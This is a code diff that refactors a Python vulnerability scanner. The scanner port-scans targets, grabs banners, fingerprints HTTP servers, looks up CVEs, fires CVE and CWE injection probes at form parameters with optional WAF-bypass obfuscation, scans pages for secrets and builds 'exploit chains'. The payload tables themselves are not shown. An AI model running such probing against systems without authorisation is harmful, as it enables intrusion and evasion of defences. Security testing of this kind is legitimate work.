+        "label": label, "poc": p.get("path", "/"), "method": method,
+        "endpoint": probe_url, "request_headers": req_headers,
+        "request_body": req_body, "result": result, "evidence": evidence,
+        "response": _resp_summary(ex, body_limit),
+        "baseline": _resp_summary(baseline, body_limit),
     }
 
 
-def best_attempt(attempts):
-    if not attempts:
-        return None
+def _cwe_attempt(target, cwe_id, probe, pt, variant, sess, limiter, baseline):
+    payload = {p: variant for p in pt["params"]}
+    limiter.wait()
+    ex = _send_pt(sess, pt, payload, limiter)
+    result = "NOT_REPRODUCED"
+    evidence = ""
+    if ex is None:
+        result = "ERROR"
+        evidence = "request failed"
+    elif (
+        is_blocked(ex) and not is_blocked(baseline)
+        and detect_waf(ex.status_code, ex.headers, ex.text)
+    ):
+        result = "WAF_BLOCKED"
+        evidence = "blocked by WAF"
+    else:
+        vuln, why = signal(ex, baseline, variant, probe)
+        if vuln:
+            result = "CONFIRMED"
+            evidence = why
+    body_limit = (
+        RESPONSE_EXCERPT_CONFIRMED
+        if result in ("CONFIRMED", "WAF_BLOCKED")
+        else RESPONSE_EXCERPT_OTHER
+    )
+    return {
+        "target": target, "test_type": "cwe", "cwe_id": cwe_id,
+        "label": probe["label"], "poc": variant, "method": pt["method"],
+        "endpoint": pt["url"], "request_headers": {}, "request_body": payload,
+        "result": result, "evidence": evidence,
+        "response": _resp_summary(ex, body_limit),
+        "baseline": _resp_summary(baseline, body_limit),
+    }
 
-    def k(a):
-        s = a.get("status", "")
-        fp = a.get("fp_status", "")
-        if fp == "LIKELY_FALSE_POSITIVE":
-            return 0
-        if fp == "NEEDS_REVIEW":
-            return 1
-        if s == "WAF_BLOCKED":
-            return 2
-        if s == "NOT_REPRODUCED":
-            return 3
-        if s == "UNVERIFIED":
-            return 4
-        return 9
 
-    return min(attempts, key=k)
-
-
-def verify_findings(
-    findings, target_url, sess, limiter, waf_bypass=False, skip_confirmed=False
-):
-    info(f"Verifying {len(findings)} findings against {target_url}")
-    probe = sess.get(target_url, timeout=15, allow_redirects=True)
-    if probe:
-        waf = detect_waf(probe.status_code, probe.headers, probe.text)
-        if waf:
-            warn(f"WAF detected: {waf['vendor']}")
-    processed = 0
-    total = len(findings)
-    for f in findings:
-        if not f.get("cve_id") and not f.get("cwe"):
+def _probe_cves(target, url, cves, sess, limiter):
+    if not cves:
+        return []
+    baseline = sess.get(url, timeout=PROBE_TIMEOUT, allow_redirects=False)
+    if baseline is None:
+        warn("Cannot fetch baseline; skipping CVE probing")
+        return []
+    bl_blob = resp_blob(baseline)
+    records = []
+    for cve_id in cves:
+        probe = CVE_PROBES.get(cve_id)
+        if not probe:
             continue
-        if skip_confirmed and f.get("false_positive_status") == "CONFIRMED":
-            continue
-        processed += 1
-        cve = (f.get("cve_id") or "").upper() or None
-        cwe = (f.get("cwe") or [None])[0]
-        info(f"[{processed}/{total}] {cve or f.get('package')} (CWE: {cwe or 'N/A'})")
-        attempts, confirmed = [], None
-        if cve and cve in CVE_PROBES:
-            r = verify_cve(target_url, cve, sess, limiter)
-            if r:
-                attempts.append(r)
-                if r["status"] == "CONFIRMED":
-                    confirmed = r
-        if not confirmed and cwe:
-            r = verify_cwe(target_url, cwe, sess, limiter, waf_bypass)
-            if r:
-                attempts.append(r)
-                if r["status"] == "CONFIRMED":
-                    confirmed = r
-        if confirmed:
-            f["verification"] = confirmed
-            confirm(cve or cwe, confirmed["method"], confirmed.get("evidence", ""))
-        else:
-            best = best_attempt(attempts)
-            if best:
-                f["verification"] = best
-                info(f"    -> {best['status']}: {best.get('evidence', '')[:100]}")
-            else:
-                f["verification"] = {
-                    "status": "UNVERIFIED",
-                    "reason": "No PoC available",
-                }
-        if attempts:
-            f["verification_attempts"] = [
-                {
-                    "method": a.get("method"),
-                    "status": a.get("status"),
-                    "fp_status": a.get("fp_status"),
-                    "evidence": a.get("evidence", a.get("reason", "")),
-                }
-                for a in attempts
-            ]
-        time.sleep(0.5)
-    for f in findings:
-        f["false_positive_status"], f["false_positive_reason"] = assess_fp(f)
-    return findings
+        for p in probe["probes"]:
+            rec = _cve_attempt(
+                target, url, cve_id, probe["label"], p,
+                sess, limiter, baseline, bl_blob,
+            )
+            records.append(rec)
+            if rec["result"] == "CONFIRMED":
+                confirmed(cve_id, probe["label"], rec["evidence"])
+                break
+    return records
 
 
-def scan_target(target, sess):
-    tgt(f"SCAN: {target}")
-    findings = []
-    pending_cpe = set()
+def _probe_cwes(target, url, page, sess, limiter):
+    if page is None:
+        info("No baseline page; CWE probing skipped")
+        return []
+    points = injection_points(page.text, url)
+    if not points:
+        info("No injection points found; CWE probing skipped")
+        return []
+    step(f"CWE probing ({len(CWE_PROBES)} classes, {len(points)} point(s))")
+    records = []
+    baselines = {}
+    for pt in points:
+        key = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
+        baselines[key] = _send_pt(
+            sess, pt, {p: "safe_test_123" for p in pt["params"]}, limiter
+        )
+    for cwe_id, probe in CWE_PROBES.items():
+        confirmed_this = False
+        for payload in probe["payloads"]:
+            variants = obfuscate(payload) if PROBE_WAF_BYPASS else [payload]
+            for variant in variants:
+                for pt in points:
+                    key = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
+                    baseline = baselines.get(key)
+                    rec = _cwe_attempt(
+                        target, cwe_id, probe, pt, variant, sess, limiter, baseline
+                    )
+                    records.append(rec)
+                    if rec["result"] == "CONFIRMED":
+                        confirmed_this = True
+                        confirmed(cwe_id, probe["label"], rec["evidence"])
+                        break
+                if confirmed_this:
+                    break
+            if confirmed_this:
+                break
+    return records
 
+
+# ─── PER-TARGET PIPELINE ──────────────────────────────────────────────
+def _resolve_url_and_host(target, sess):
     cands = normalize_target(target)
     info(f"Candidates: {cands}")
     working = detect_working_url(cands, sess)
@@ -1860,264 +2080,353 @@ def scan_target(target, sess):
         warn("No HTTP/HTTPS endpoint responded")
     host = extract_host(target)
     info(f"Host: {host}")
+    return url, host
+
+
+def _scan_ports(host, ports, timeout, workers):
+    open_ports = port_scan(host, ports, timeout, workers)
+    port_data = [{"port": p, "service": s} for p, s in sorted(open_ports.items())]
+    if not open_ports:
+        info("No common ports open")
+        return open_ports, port_data
+    info(f"Open: {sorted(open_ports.keys())}")
+    for p, s in sorted(open_ports.items()):
+        finding("INFO", f"port-{p}", f"{s} open")
+    return open_ports, port_data
+
+
+def _tech_label(d):
+    if "port" in d:
+        return f"{d['name']} {d['version']} on port {d['port']}"
+    return f"{d['name']} {d['version']} via HTTP"
+
+
+def _scan_banners(host, open_ports):
+    techs = []
+    for port in open_ports:
+        raw = auto_banner(host, port)
+        if not raw:
+            continue
+        info(f"Port {port}: {raw[:100]!r}")
+        for d in fingerprint_banner(raw):
+            d["port"] = port
+            finding("INFO", d["name"], _tech_label(d))
+            techs.append(d)
+    return techs
+
+
+def _scan_http_tech(url, sess):
+    techs = fingerprint_http(url, sess)
+    for d in techs:
+        finding("INFO", d["name"], _tech_label(d))
+    return techs
+
+
+def _resolve_cves(technologies):
+    from_osv = set()
+    if LOOKUP_OSV and technologies:
+        looked = set()
+        for d in technologies:
+            product = (d.get("product") or "").lower()
+            version = d.get("version")
+            if not product or not version:
+                continue
+            if product not in OSV_ECOSYSTEM_MAP:
+                continue
+            key = (product, version)
+            if key in looked:
+                continue
+            looked.add(key)
+            cves = osv_lookup(product, version)
+            info(f"  {product} {version}: {len(cves)} CVE(s) from OSV")
+            from_osv.update(cves)
+    all_cves = set(CVE_PROBES.keys()) | from_osv
+    testable = sorted(c for c in all_cves if c in CVE_PROBES)
+    untested = sorted(c for c in all_cves if c not in CVE_PROBES)
+    return testable, untested
+
+
+def scan_target(target, sess):
+    tgt(f"SCAN: {target}")
+    recon = {
+        "target": target,
+        "host": None,
+        "working_url": None,
+        "open_ports": [],
+        "technologies": [],
+        "waf": None,
+        "secrets": [],
+        "known_cves": {"testable": [], "untested": []},
+        "exploit_chains": [],
+    }
+
+    url, host = _resolve_url_and_host(target, sess)
+    recon["host"] = host
+    recon["working_url"] = url
 
     open_ports = {}
-    if AUTO_PORT_SCAN:
+    if SCAN_PORTS:
         step("Port scan")
         ports = CUSTOM_PORTS or COMMON_PORTS
-        open_ports = port_scan(host, ports, PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS)
-        if open_ports:
-            info(f"Open: {sorted(open_ports.keys())}")
-            for port, svc in sorted(open_ports.items()):
-                finding("INFO", f"port-{port}", f"{svc} open")
-                findings.append(
-                    {
-                        "package": f"port-{port}",
-                        "version": "",
-                        "ecosystem": "Network",
-                        "source": "PortScan",
-                        "summary": f"Port {port} open ({svc})",
-                        "port": port,
-                        "service": svc,
-                        "cve_id": None,
-                        "cwe": [],
-                        "false_positive_status": "CONFIRMED",
-                        "false_positive_reason": "TCP connect succeeded",
-                        "priority": "INFO",
-                    }
-                )
-        else:
-            info("No common ports open")
-
-    if AUTO_BANNER_GRAB and open_ports:
-        step("Banner grab")
-        for port in open_ports:
-            b = auto_banner(host, port)
-            if not b:
-                continue
-            info(f"Port {port}: {b[:100]!r}")
-            det, pend = fingerprint_banner(b)
-            for name, ver in det.items():
-                finding("INFO", name, f"{ver} on port {port}")
-                findings.append(
-                    {
-                        "package": name.lower(),
-                        "version": ver,
-                        "ecosystem": "Banner",
-                        "source": "Banner",
-                        "summary": f"{name} {ver} on port {port}",
-                        "port": port,
-                        "cve_id": None,
-                        "cwe": [],
-                        "false_positive_status": "CONFIRMED",
-                        "false_positive_reason": (
-                            f"Version from banner on port {port}"
-                        ),
-                        "priority": "INFO",
-                    }
-                )
-            pending_cpe.update(pend)
-
-    if url and AUTO_HTTP_FINGERPRINT:
-        step("HTTP fingerprint")
-        det, pend = fingerprint_http(url, sess)
-        for name, ver in det.items():
-            finding("INFO", name, f"{ver} via HTTP")
-            findings.append(
-                {
-                    "package": name.lower(),
-                    "version": ver,
-                    "ecosystem": "HTTP",
-                    "source": "HTTP",
-                    "summary": f"{name} {ver} via HTTP headers",
-                    "cve_id": None,
-                    "cwe": [],
-                    "false_positive_status": "CONFIRMED",
-                    "false_positive_reason": "Version from HTTP response",
-                    "priority": "INFO",
-                }
-            )
-        pending_cpe.update(pend)
-
-    if pending_cpe:
-        step(f"CPE lookup ({len(pending_cpe)} unique)")
-        for triple in pending_cpe:
-            findings.extend(cpe_lookup(*triple))
-
-    seen, dedup = set(), []
-    for f in findings:
-        k = (f.get("cve_id"), f.get("package"), f.get("port"))
-        if k not in seen:
-            seen.add(k)
-            dedup.append(f)
-
-    if dedup:
-        step("Enrichment")
-        dedup = enrich(dedup)
-    if AUTO_PROBE and url:
-        pt = [f for f in dedup if f.get("cve_id") or f.get("cwe")]
-        if pt:
-            step(f"PoC verification ({len(pt)} candidates)")
-            dedup = verify_findings(
-                dedup,
-                url,
-                sess,
-                RateLimiter(PROBE_RATE, PROBE_JITTER),
-                waf_bypass=PROBE_WAF_BYPASS,
-            )
-    return dedup
-
-
-def save_json(fs, p):
-    p.parent.mkdir(parents=True, exist_ok=True)
-    p.write_text(json.dumps(fs, indent=2, ensure_ascii=False), encoding="utf-8")
-    info(f"JSON saved: {p}")
-
-
-def save_html(fs, p):
-    p.parent.mkdir(parents=True, exist_ok=True)
-    order = {
-        "CRITICAL": 0,
-        "HIGH": 1,
-        "MEDIUM": 2,
-        "LOW": 3,
-        "INFO": 4,
-        "UNKNOWN": 5,
-    }
-    esc = htmllib.escape
-    rows = []
-    for f in sorted(
-        fs, key=lambda x: (order.get(x.get("priority"), 5), -(x.get("epss") or 0))
-    ):
-        cve = esc(f.get("cve_id") or f.get("package") or "\u2014")
-        cwes = f.get("cwe") or []
-        cwe_n = esc(cwe_name(cwes[0]) if cwes else "\u2014")
-        cwe_l = esc(", ".join(cwes))
-        prio = f.get("priority", "UNKNOWN")
-        fp = f.get("false_positive_status", "UNKNOWN")
-        reason = esc((f.get("false_positive_reason") or "")[:200])
-        pkg = esc(str(f.get("package", "?")))
-        ver = esc(str(f.get("version", "")))
-        cvss = f.get("cvss")
-        cvss_s = esc(str(cvss)) if cvss is not None else "-"
-        color = {
-            "CRITICAL": "#b71c1c",
-            "HIGH": "#d84315",
-            "MEDIUM": "#f57f17",
-            "LOW": "#2e7d32",
-            "INFO": "#1976d2",
-        }.get(prio, "#555")
-        fpc = {
-            "CONFIRMED": "#b71c1c",
-            "LIKELY_REAL": "#d84315",
-            "NEEDS_REVIEW": "#f57f17",
-            "LIKELY_FALSE_POSITIVE": "#2e7d32",
-            "UNVERIFIED": "#555",
-        }.get(fp, "#555")
-        rows.append(
-            f"<tr><td style='color:{color};font-weight:bold'>{esc(prio)}</td>"
-            f"<td>{cve}<br><small>{cwe_n} {cwe_l}</small></td>"
-            f"<td>{pkg} <small>{ver}</small></td>"
-            f"<td>{cvss_s}</td>"
-            f"<td>{(f.get('epss') or 0):.2%}</td>"
-            f"<td>{'Yes' if f.get('in_kev') else 'No'}</td>"
-            f"<td style='color:{fpc};font-weight:bold'>{esc(fp)}</td>"
-            f"<td><small>{reason}</small></td></tr>"
+        open_ports, port_data = _scan_ports(
+            host, ports, PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS
         )
-    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Scan Report</title>
-<style>body{{font-family:system-ui,sans-serif;margin:20px;color:#222}}
-h1{{border-bottom:2px solid #333;padding-bottom:8px}}
-table{{border-collapse:collapse;width:100%;font-size:13px}}
-th,td{{border:1px solid #ddd;padding:6px 8px;text-align:left;vertical-align:top}}
-th{{background:#f4f4f4;position:sticky;top:0}}
-tr:nth-child(even){{background:#fafafa}}small{{color:#666}}.meta{{color:#666;margin-bottom:16px}}
-</style></head><body><h1>Scan Report</h1>
-<div class="meta">{time.strftime("%Y-%m-%d %H:%M:%S")} \u00b7 {len(fs)} finding(s)</div>
-<table><thead><tr><th>Priority</th><th>CVE / Type</th><th>Package</th><th>CVSS</th>
-<th>EPSS</th><th>KEV</th><th>FP Status</th><th>Reason</th></tr></thead>
-<tbody>{''.join(rows)}</tbody></table></body></html>"""
-    p.write_text(html, encoding="utf-8")
-    info(f"HTML saved: {p}")
+        recon["open_ports"] = port_data
+
+    if GRAB_BANNERS and open_ports:
+        step("Banner grab")
+        recon["technologies"].extend(_scan_banners(host, open_ports))
+
+    if url and FINGERPRINT_HTTP:
+        step("HTTP fingerprint")
+        recon["technologies"].extend(_scan_http_tech(url, sess))
+
+    tests = []
+    need_page = url and (TEST_CVES or TEST_CWES or SCAN_SECRETS)
+    if not need_page:
+        return recon, tests
+
+    page = sess.get(url, timeout=PROBE_TIMEOUT, allow_redirects=True)
+
+    if page:
+        waf = detect_waf(page.status_code, page.headers, page.text)
+        if waf:
+            recon["waf"] = waf
+            warn(f"WAF detected: {waf['vendor']}")
+
+    if SCAN_SECRETS and page:
+        step("Secret scan")
+        secrets = _scan_target_secrets(target, url, page, sess)
+        recon["secrets"] = secrets
+        for s in secrets:
+            finding("HIGH", s["rule"], s["source"])
+
+    limiter = RateLimiter(PROBE_RATE, PROBE_JITTER)
+
+    if LOOKUP_OSV and recon["technologies"]:
+        step(f"OSV lookup ({len(recon['technologies'])} technology/technologies)")
+    testable, untested = _resolve_cves(recon["technologies"])
+    recon["known_cves"] = {"testable": testable, "untested": untested}
+
+    if TEST_CVES:
+        step(f"CVE probing ({len(testable)} testable, "
+             f"{len(untested)} untested from OSV)")
+        tests.extend(_probe_cves(target, url, testable, sess, limiter))
+
+    if TEST_CWES and page:
+        tests.extend(_probe_cwes(target, url, page, sess, limiter))
+
+    if BUILD_ATTACK_CHAINS:
+        recon["exploit_chains"] = _build_chains(tests)
+        for ch in recon["exploit_chains"]:
+            finding("HIGH", ch["name"], ch["description"])
+
+    return recon, tests
 
 
-def summary(fs):
-    if not fs:
-        info("No findings.")
+# ─── REPORTING ────────────────────────────────────────────────────────
+def _summary_counts(tests):
+    counts = {
+        "total_tests": len(tests),
+        "confirmed": 0, "waf_blocked": 0,
+        "not_reproduced": 0, "errors": 0,
+    }
+    for t in tests:
+        r = t.get("result", "")
+        if r == "CONFIRMED":
+            counts["confirmed"] += 1
+        elif r == "WAF_BLOCKED":
+            counts["waf_blocked"] += 1
+        elif r == "NOT_REPRODUCED":
+            counts["not_reproduced"] += 1
+        elif r == "ERROR":
+            counts["errors"] += 1
+    return counts
+
+
+def _print_summary(tests):
+    if not tests:
+        info("No tests run.")
         return
-    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
-    fs.sort(key=lambda f: (order.get(f.get("priority"), 5), -(f.get("epss") or 0)))
     bar = "\u2500" * 88
     LOG("\n" + bar)
     LOG("SUMMARY")
     LOG(bar)
-    for f in fs:
-        cve = f.get("cve_id") or f.get("package", "?")
-        finding(f.get("priority", "UNKNOWN"), cve, (f.get("summary") or "")[:100])
-        if f.get("false_positive_status") == "CONFIRMED":
-            info(f"    \u2713 {f.get('false_positive_reason', '')[:150]}")
-    counts = {}
-    for f in fs:
-        k = f.get("false_positive_status")
-        counts[k] = counts.get(k, 0) + 1
+
+    confirmed_tests = [t for t in tests if t["result"] == "CONFIRMED"]
+    blocked_tests = [t for t in tests if t["result"] == "WAF_BLOCKED"]
+
+    if confirmed_tests:
+        LOG(f"  CONFIRMED ({len(confirmed_tests)}):")
+        for t in confirmed_tests:
+            ident = t.get("cve_id") or t.get("cwe_id") or "?"
+            finding("HIGH", ident, t.get("label", "")[:100])
+            info(f"    {t.get('endpoint', '')[:150]}")
+            info(f"    evidence: {t.get('evidence', '')[:150]}")
+
+    if blocked_tests:
+        LOG(f"\n  BLOCKED BY WAF ({len(blocked_tests)}):")
+        seen = set()
+        for t in blocked_tests:
+            ident = t.get("cve_id") or t.get("cwe_id") or "?"
+            if ident in seen:
+                continue
+            seen.add(ident)
+            finding("MEDIUM", ident, t.get("label", "")[:100])
+
+    counts = _summary_counts(tests)
     LOG("\n" + bar)
-    for k in (
-        "CONFIRMED",
-        "LIKELY_REAL",
-        "NEEDS_REVIEW",
-        "LIKELY_FALSE_POSITIVE",
-        "UNVERIFIED",
-    ):
-        if counts.get(k):
-            LOG(f"  {k:<22}: {counts[k]}")
-    LOG(f"  {'TOTAL':<22}: {len(fs)}")
+    LOG(f"  Tests total   : {counts['total_tests']}")
+    LOG(f"  Confirmed     : {counts['confirmed']}")
+    LOG(f"  Blocked (WAF) : {counts['waf_blocked']}")
+    LOG(f"  Not reproduced: {counts['not_reproduced']}")
+    LOG(f"  Errors        : {counts['errors']}")
     LOG(bar)
+
+
+def _save_json(data, p):
+    try:
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
+        info(f"JSON saved: {p}")
+    except (OSError, ValueError, TypeError) as e:
+        err(f"Could not write JSON ({p}): {e}")
+
+
+# ─── RUNNER ───────────────────────────────────────────────────────────
+_TIMEOUT = object()
+
+
+def run_with_deadline(fn, args=(), kwargs=None, timeout=60):
+    kwargs = kwargs or {}
+    box = {"result": None, "error": None}
+    done = threading.Event()
+
+    def runner():
+        try:
+            box["result"] = fn(*args, **kwargs)
+        except BaseException as e:
+            box["error"] = e
+        finally:
+            done.set()
+
+    t = threading.Thread(target=runner, daemon=True)
+    t.start()
+    if done.wait(timeout):
+        if box["error"] is not None:
+            raise box["error"]
+        return box["result"]
+    return _TIMEOUT
+
+
+def _scan_all_targets():
+    all_recon = []
+    all_tests = []
+    errors = []
+    for i, target in enumerate(TARGETS, 1):
+        try:
+            LOG(f"\n[{i}/{len(TARGETS)}] Scanning {target}")
+            result = run_with_deadline(
+                scan_target, args=(target, Session()), timeout=TARGET_TIMEOUT
+            )
+            if result is _TIMEOUT:
+                msg = f"Target {target} exceeded {TARGET_TIMEOUT}s; moving on"
+                warn(msg)
+                errors.append({"target": target, "type": "timeout", "error": msg})
+                continue
+            recon, tests = result
+            all_recon.append(recon)
+            all_tests.extend(tests)
+        except KeyboardInterrupt:
+            warn("Interrupted")
+            errors.append(
+                {"target": target, "type": "interrupt", "error": "Interrupted"}
+            )
+            break
+        except Exception as e:
+            err(f"Target failed: {e}")
+            errors.append({"target": target, "type": "exception", "error": str(e)})
+            continue
+    return all_recon, all_tests, errors
 
 
 def main():
     global LOG
     OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
     ts = time.strftime("%Y%m%d-%H%M%S")
-    try:
-        LOG.close()
-    except Exception:
-        pass
-    LOG = Log(OUTPUT_DIR / f"scan-{ts}.log")
+    LOG = Log()
+
     bar = "\u2550" * 88
     LOG(
         f"\n{bar}\n"
-        f"  CVE Scanner \u2014 Standalone (pure Python)\n"
-        f"  Targets: {len(TARGETS)}\n"
-        f"  Output:  {OUTPUT_DIR.absolute()}\n"
+        f"  CVE Scanner\n"
+        f"  Targets : {len(TARGETS)}\n"
+        f"  Output  : {OUTPUT_DIR.absolute()}\n"
         f"{bar}"
     )
-    sess = Session()
-    all_f = []
-    for i, target in enumerate(TARGETS, 1):
-        try:
-            LOG(f"\n[{i}/{len(TARGETS)}] Scanning {target}")
-            all_f.extend(scan_target(target, sess))
-        except KeyboardInterrupt:
-            warn("Interrupted")
-            break
-        except Exception as e:
-            err(f"Target failed: {e}")
-            continue
-    seen, final = set(), []
-    for f in all_f:
-        k = (f.get("cve_id"), f.get("package"), f.get("port"))
-        if k not in seen:
-            seen.add(k)
-            final.append(f)
-    summary(final)
-    if SAVE_JSON:
-        save_json(final, OUTPUT_DIR / f"findings-{ts}.json")
-    if SAVE_HTML:
-        save_html(final, OUTPUT_DIR / f"report-{ts}.html")
+
+    started = time.monotonic()
+    all_recon, all_tests, errors = _scan_all_targets()
+    duration = time.monotonic() - started
+
+    _print_summary(all_tests)
     LOG(
         f"\n{bar}\n"
-        f"  DONE \u2014 {len(final)} finding(s) from {len(TARGETS)} target(s)\n"
+        f"  DONE \u2014 {len(all_tests)} test(s), "
+        f"{_summary_counts(all_tests)['confirmed']} confirmed, "
+        f"from {len(TARGETS)} target(s) in {duration:.1f}s\n"
         f"{bar}\n"
     )
+
+    all_secrets = [s for r in all_recon for s in r.get("secrets", [])]
+    all_chains = [
+        dict(ch, target=r["target"])
+        for r in all_recon
+        for ch in r.get("exploit_chains", [])
+    ]
+
+    summary = _summary_counts(all_tests)
+    summary["targets_scanned"] = len(all_recon)
+    summary["targets_failed"] = len(errors)
+    summary["secrets_found"] = len(all_secrets)
+    summary["exploit_chains_found"] = len(all_chains)
+
+    output = {
+        "timestamp": ts,
+        "targets": TARGETS,
+        "duration_seconds": round(duration, 1),
+        "config": {
+            "scan_ports": SCAN_PORTS,
+            "grab_banners": GRAB_BANNERS,
+            "fingerprint_http": FINGERPRINT_HTTP,
+            "test_cves": TEST_CVES,
+            "test_cwes": TEST_CWES,
+            "lookup_osv": LOOKUP_OSV,
+            "scan_secrets": SCAN_SECRETS,
+            "build_attack_chains": BUILD_ATTACK_CHAINS,
+            "insecure_tls": INSECURE_TLS,
+            "port_scan_timeout": PORT_SCAN_TIMEOUT,
+            "port_scan_workers": PORT_SCAN_WORKERS,
+            "probe_timeout": PROBE_TIMEOUT,
+            "probe_waf_bypass": PROBE_WAF_BYPASS,
+            "probe_rate": PROBE_RATE,
+            "probe_jitter": PROBE_JITTER,
+            "target_timeout": TARGET_TIMEOUT,
+            "total_cve_probes": len(CVE_PROBES),
+            "total_cwe_probes": len(CWE_PROBES),
+        },
+        "summary": summary,
+        "errors": errors,
+        "recon": all_recon,
+        "test_results": all_tests,
+        "secrets": all_secrets,
+        "exploit_chains": all_chains,
+        "logs": LOG.messages,
+    }
+
+    if SAVE_JSON:
+        _save_json(output, OUTPUT_DIR / f"scan-{ts}.json")
+
     LOG.close()
 
 
